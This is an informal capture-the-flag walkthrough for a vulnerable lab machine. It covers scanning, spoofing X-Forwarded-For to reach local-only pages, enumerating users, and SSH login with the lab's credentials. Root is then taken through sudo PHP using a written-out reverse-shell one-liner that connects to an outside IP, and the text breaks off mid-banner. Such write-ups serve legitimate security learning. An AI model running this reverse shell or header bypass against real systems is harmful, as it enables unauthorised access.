Gt the ip 

an nmap scan gave us

Nikto scan gave us 

/robots.txt
/config
/misc


the index page is also ....there  we are suggested to use x-forwarded-for 

Ok so we the pages can be accessed locally . 

for which we need X-Forwarded-For:127.0.0.1

to be send with every request made . 

We go into burp suite add a header to the request 


Now we can access the pages and we create a user 

On the page we find that we can enumerate users 

We found out Alice's password 

The credentials are 

alice 

4lic3

We ran intruder and tried to see the other users 

Since the ssh is open 

we try ssh alice@ip

and we connect to alice 

We see a .my_secret directory 

and see the contents 

First the flag 

Greattttt my brother! You saw the Alice's note! Now you save the record information to give to bob! I know if it's given to him then Bob will be hurt but this is better than Bob cheated!

Now your last job is get access to the root and read the flag ^_^

Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09}


Now the notes 

Woahhh! I like this company, I hope that here i get a better partner than bob ^_^, hopefully Bob doesn't know my notes

Too bad for bob ..


Lets get the root 

So we check for sudo -l 

we see /usr/bin/php running on the server 

So we decide to go for a reverse shell

sudo /usr/bin/php -r '$s=fsockopen("192.168.57.203",9989);exec("/bin/sh -i<&3 >&3 2>&3");'

getting a reverse shell as root 

We get the second flag 

  ________        __    ___________.__             ___________.__                ._.
 /  _____/  _____/  |_  \__    ___/|  |__   ____   \_   _____/|  | _____     ____| |
/   \  ___ /  _ \   __\   |    |   |  |  \_/ __ \   |    __)  |  | \__  \   / ___\ |
\    \_\  (  <_> )  |     |    |   |   Y  \  ___/   |     \   |  |__/ __ \_/ /_/  >|
